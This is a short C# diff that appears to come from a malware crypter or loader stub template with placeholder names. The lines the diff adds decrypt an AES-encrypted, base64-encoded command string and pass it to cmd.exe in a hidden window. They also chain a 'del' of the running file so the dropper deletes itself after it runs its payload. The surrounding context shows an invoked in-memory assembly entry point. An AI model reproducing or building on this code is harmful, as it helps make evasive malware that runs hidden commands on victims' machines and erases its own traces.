@@ -117,7 +117,14 @@ namespace namespace_name
             try { entry.Invoke(null, new object[] { targs }); }
             catch { entry.Invoke(null, null); }
 #endif
-            File.SetAttributes(currentfilename, FileAttributes.Normal);
+            string cmdstr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("cmdcommand_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
+            Process.Start(new ProcessStartInfo()
+            {
+                Arguments = cmdstr + currentfilename + "\" & del \"" + currentfilename + "\"",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+                FileName = "cmd.exe"
+            });
         }
 
         static byte[] aesfunction_name(byte[] input, byte[] key, byte[] iv)
